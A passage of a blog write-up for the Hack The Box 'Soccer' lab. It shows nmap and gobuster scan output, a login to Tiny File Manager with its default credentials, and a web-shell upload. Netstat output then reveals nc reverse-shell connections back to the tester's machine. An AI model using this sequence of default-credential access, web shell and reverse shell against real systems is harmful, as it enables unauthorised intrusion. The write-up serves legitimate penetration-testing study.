@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Soccer Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Soccer Write-up" />
+<meta name="description" content="A write-up for the Soccer box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-soccer-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Soccer Write-up">
+  <meta property="og:description" content="A write-up for the Soccer box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-01-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-29T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Soccer Write-up">
+  <meta name="twitter:description" content="A write-up for the Soccer box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Soccer Write-up">
+  <meta itemprop="description" content="A write-up for the Soccer box.">
+  <meta itemprop="datePublished" content="2025-01-29T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-01-29T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2542">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Soccer Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-01-29'>
+      29 Jan, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>Soccer is box that cycles through enumeration and exploitation which is very similar to real-word pentesting. In this box, you exploit a file upload vulnerability that gives you an initial shell only to find another virtual host. After identifying that WebSockets are being used, you find a SQL injection vulnerability which results in credentials for a user on the box. Finally, you find a SETUID bit set that allows you to run another program which is able to run a python script, eventually resulting in a root shell.</p>
+<hr>
+<p>Starting off with our nmap scans.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.194 -oA Soccer_tcp1k
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:03 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.194
+</span></span><span style="display:flex;"><span>Host is up (0.040s latency).
+</span></span><span style="display:flex;"><span>Not shown: 997 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>9091/tcp open  xmltec-xmlmail
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.194 -oA Scans/Soccer_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:05 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.194
+</span></span><span style="display:flex;"><span>Host is up (0.051s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65532 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
+</span></span><span style="display:flex;"><span>|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://soccer.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>9091/tcp open  xmltec-xmlmail?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 404 Not Found
+</span></span><span style="display:flex;"><span>|     Content-Security-Policy: default-src &#39;none&#39;
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 139
+</span></span><span style="display:flex;"><span>|     Date: Thu, 30 Jan 2025 19:05:37 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang=&#34;en&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|   HTTPOptions, RTSPRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 404 Not Found
+</span></span><span style="display:flex;"><span>|     Content-Security-Policy: default-src &#39;none&#39;
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: 143
+</span></span><span style="display:flex;"><span>|     Date: Thu, 30 Jan 2025 19:05:37 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang=&#34;en&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port9091-TCP:V=7.94SVN%I=7%D=1/30%Time=679BCD7B%P=x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:(informix,2F,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
+</span></span><span style="display:flex;"><span>SF:e\r\n\r\n&#34;)%r(drda,2F,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
+</span></span><span style="display:flex;"><span>SF::\x20close\r\n\r\n&#34;)%r(GetRequest,168,&#34;HTTP/1\.1\x20404\x20Not\x20Found
+</span></span><span style="display:flex;"><span>SF:\r\nContent-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type
+</span></span><span style="display:flex;"><span>SF:-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
+</span></span><span style="display:flex;"><span>SF:nContent-Length:\x20139\r\nDate:\x20Thu,\x2030\x20Jan\x202025\x2019:05:
+</span></span><span style="display:flex;"><span>SF:37\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20l
+</span></span><span style="display:flex;"><span>SF:ang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\
+</span></span><span style="display:flex;"><span>SF:n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r
+</span></span><span style="display:flex;"><span>SF:(HTTPOptions,16C,&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
+</span></span><span style="display:flex;"><span>SF:Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\
+</span></span><span style="display:flex;"><span>SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
+</span></span><span style="display:flex;"><span>SF:43\r\nDate:\x20Thu,\x2030\x20Jan\x202025\x2019:05:37\x20GMT\r\nConnecti
+</span></span><span style="display:flex;"><span>SF:on:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n
+</span></span><span style="display:flex;"><span>SF:&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pr
+</span></span><span style="display:flex;"><span>SF:e&gt;Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r(RTSPRequest,16C,
+</span></span><span style="display:flex;"><span>SF:&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defaul
+</span></span><span style="display:flex;"><span>SF:t-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\
+</span></span><span style="display:flex;"><span>SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Th
+</span></span><span style="display:flex;"><span>SF:u,\x2030\x20Jan\x202025\x2019:05:37\x20GMT\r\nConnection:\x20close\r\n\
+</span></span><span style="display:flex;"><span>SF:r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=
+</span></span><span style="display:flex;"><span>SF:\&#34;utf-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIO
+</span></span><span style="display:flex;"><span>SF:NS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r(RPCCheck,2F,&#34;HTTP/1\.1\x20400\x20
+</span></span><span style="display:flex;"><span>SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;)%r(DNSVersionBindReqTCP
+</span></span><span style="display:flex;"><span>SF:,2F,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
+</span></span><span style="display:flex;"><span>SF:&#34;)%r(DNSStatusRequestTCP,2F,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
+</span></span><span style="display:flex;"><span>SF:ection:\x20close\r\n\r\n&#34;)%r(Help,2F,&#34;HTTP/1\.1\x20400\x20Bad\x20Reques
+</span></span><span style="display:flex;"><span>SF:t\r\nConnection:\x20close\r\n\r\n&#34;)%r(SSLSessionReq,2F,&#34;HTTP/1\.1\x2040
+</span></span><span style="display:flex;"><span>SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;);
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The first thing that immediately catches my attention is port 80 being open. We also see 9091 with some HTTP 400 errors, which is interesting. Let&rsquo;s try to go to the website first. We get an error telling us that &ldquo;soccer.htb&rdquo; is an unknown host.</p>
+<p><img src="/images/Soccer/Unknown_host.png" alt="Unknown host"></p>
+<p>So we add &ldquo;soccer.htb&rdquo; to our /etc/hosts file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Others
+</span></span><span style="display:flex;"><span>10.10.11.194    soccer.htb
+</span></span></code></pre></div><p>Now we refresh the page, and we can see the soccer.htb website!</p>
+<p><img src="/images/Soccer/soccer_htb.png" alt="Soccer.htb"></p>
+<p>The response tells us this is nginx version 1.18.0 running on Ubuntu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 30 Jan 2025 19:45:45 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html</span>
+</span></span><span style="display:flex;"><span>Last-Modified<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 17 Nov 2022 08:07:11 GMT</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>ETag<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;6375ebaf-1b05&#34;</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">6917</span>
+</span></span></code></pre></div><p>We look around here, but there isn&rsquo;t really anything to navigate to. Let&rsquo;s go to port 9091. We get a single line response of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cannot GET /
+</span></span></span></code></pre></div><p>Interesting. Let&rsquo;s do some directory enumeration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://soccer.htb
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 300
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/.hta                 (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/.htpasswd            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/.htaccess            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/index.html           (Status: 200) [Size: 6917]
+</span></span><span style="display:flex;"><span>Progress: 4614 / 4615 (99.98%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>Nothing really. One of the things I&rsquo;ve learned is that you should try multiple wordlists before moving on. Think about it, there could be a single directory in a wordlist that you might miss and that could end up being the way in. Let&rsquo;s try another wordlist.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://soccer.htb/
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 10
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]
+</span></span></code></pre></div><p>Yup, we get a hit. Let&rsquo;s navigate to this page.
+<img src="/images/Soccer/tiny.png" alt="Tiny File Manager"></p>
+<p>This is <a href="https://tinyfilemanager.github.io/">Tiny File Manager</a> which is a web-based file manager in PHP. A quick Google search says the default credentials are:</p>
+<p>admin:admin@123
+user:12345</p>
+<p>Both of these credentials work!</p>
+<p>We can see the version number if we search for &ldquo;version&rdquo; in the source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">SNIP</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://tinyfilemanager.github.io/&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-muted&#34;</span> <span style="color:#a6e22e">data-version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.4.3&#34;</span>&gt;CCP Programmers&lt;/<span style="color:#f92672">a</span>&gt; &amp;mdash;&amp;mdash;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">SNIP</span>&gt;
+</span></span></code></pre></div><p>There is a path traversal vulnerability in the file upload function for versions &lt;=2.4.6. If you have a valid user account, you can upload malicious PHP files to the webroot and achieve code execution. However, since we already have admin access, we can just upload our file without having to exploit this.</p>
+<p>A unique problem that I ran into: When I had FoxyProxy to send traffic through Burp, the web page was all messed up. It broke the file upload functionality and nothing would work. It looked like this:
+<img src="/images/Soccer/Upload.png" alt="Broken site"></p>
+<p>The solution was to simply turn off the proxy and then it worked fine.</p>
+<p>A good habit to get into is to use a hash, or very long random string as your web shell&rsquo;s file name. In the real world, when we upload web shells, we don&rsquo;t want a hacker to be able to find our web shell by fuzzing. In those cases, we would have introduced a critical finding into our client&rsquo;s infrastructure and that&rsquo;s not good. Additionally, our web shell should have a username and password requirement and ideally only allow our IP.</p>
+<p>Let&rsquo;s upload our web shell in the /var/www/html/tiny/uploads folder.
+<img src="/images/Soccer/webshell_upload.png" alt="Upload webshell"></p>
+<p>And now we have a working shell!
+<img src="/images/Soccer/webshell.png" alt="Webshell"></p>
+<p>However, something weird keeps happening. Every minute or so, my webshell is deleted. I&rsquo;m wondering if there is a script to delete everything out of uploads that runs every minute or so. So we will quickly get a reverse shell.</p>
+<p><img src="/images/Soccer/webshell_rev.png" alt="Webshell reverse shell"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@soccer:~/html/tiny/uploads$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>We search around for ways to elevate privileges, but can&rsquo;t find anything. So we have whatever is running on port 9091, which we still haven&rsquo;t gained any information to exploit that. Let&rsquo;s check what other ports are open internally on the box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@soccer:/etc/nginx/sites-enabled$ netstat -anotp
+</span></span><span style="display:flex;"><span>netstat -anotp
+</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1114/nginx: worker   off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.1:3306          127.0.0.1:60062         ESTABLISHED -                    keepalive (1997.40/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42084       ESTABLISHED 1114/nginx: worker   on (0.21/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 127.0.0.1:60062         127.0.0.1:3306          ESTABLISHED -                    off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42106       ESTABLISHED 1115/nginx: worker   on (0.22/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42094       ESTABLISHED 1115/nginx: worker   on (0.22/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42132       ESTABLISHED 1114/nginx: worker   on (0.21/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42102       ESTABLISHED 1115/nginx: worker   on (0.22/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42116       ESTABLISHED 1114/nginx: worker   on (0.20/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 10.10.11.194:38450      10.10.14.55:8443        CLOSE_WAIT  12529/nc             off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42154       ESTABLISHED 1114/nginx: worker   on (0.21/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 10.10.11.194:38984      10.10.14.55:8443        CLOSE_WAIT  12755/nc             off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 10.10.11.194:54736      10.10.14.55:8443        CLOSE_WAIT  12457/nc             off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42092       ESTABLISHED 1115/nginx: worker   on (0.21/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42104       ESTABLISHED 1114/nginx: worker   on (0.21/0/0)
+</span></span><span style="display:flex;"><span>tcp        0    380 10.10.11.194:80         10.10.14.55:42148       ESTABLISHED 1114/nginx: worker   on (0.22/0/0)
+</span></span><span style="display:flex;"><span>tcp        0      0 10.10.11.194:80         10.10.14.55:42090       ESTABLISHED 1114/nginx: worker   off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp        0     16 10.10.11.194:41884      10.10.14.55:8443        ESTABLISHED 12901/nc             on (0.22/0/0)
+</span></span><span style="display:flex;"><span>tcp6       0      0 :::80                   :::*                    LISTEN      1114/nginx: worker   off (0.00/0/0)
+</span></span><span style="display:flex;"><span>tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
